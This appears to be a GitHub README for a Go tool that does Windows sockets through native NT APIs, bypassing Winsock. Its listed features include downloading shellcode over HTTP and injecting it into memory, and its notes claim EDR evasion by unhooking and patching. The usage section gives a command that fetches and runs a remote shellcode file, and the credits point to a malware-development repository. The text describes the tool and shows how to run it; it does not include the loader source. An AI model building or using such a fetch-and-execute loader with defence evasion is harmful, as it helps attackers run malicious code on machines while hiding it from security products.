# go-nt-socket

a pure go implementation of windows sockets using native nt apis, avoiding winsock entirely.

## demo
https://github.com/user-attachments/assets/1ab131dd-34d5-4e29-90e4-8cbefde25d5a



## credits

this project builds upon research and techniques from various security researchers:
- [Original NT Socket Research](https://www.x86matthew.com/view_post?id=ntsockets) by x86matthew
- [Rust Implementation](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/NtSockets) by [@5mukx](https://twitter.com/5mukx) (like a lot of my projects, shoutout him lol)
- my go-native-syscall library for nt api access and access to rtl calls for heap ops

## features

- tcp/udp socket creation using afd endpoints
- dns resolution via udp sockets  
- http file downloading
- shellcode injection using private heap allocation
- file operations using nt apis
- content verification and retry mechanisms

## usage
```bash
# from project root
go run ./server/fileserver.go

# this serves test files on `http://localhost:8080/test.txt` and `http://localhost:8080/calc.bin`
# then open a new shell to perform the download or injection passing either as the url based on ur desired flag :3

```


### file download mode
```bash

./go-nt-socket.exe http://example.com/file.txt output.txt
```

### shellcode injection mode
```bash
./go-nt-socket.exe http://example.com/shellcode.bin dummy --inject
```

**important**: when using `--inject` mode, you must pass `dummy` (or any string) as the output file parameter. this parameter is ignored during injection but required by the argument parser.

## building

```bash
export CGO_ENABLED=1 # bc of go-native-syscall (ironic isn't it)
go mod tidy
go build -o go-nt-socket.exe ./cmd
```

## notes

- requires windows (uses nt apis)
- shellcode injection uses heap allocation to avoid go garbage collector interference  
- includes content verification to detect memory corruption
- implements manual http/1.0 client without standard library dependencies
- uses unhooking and patching techniques for edr evasion




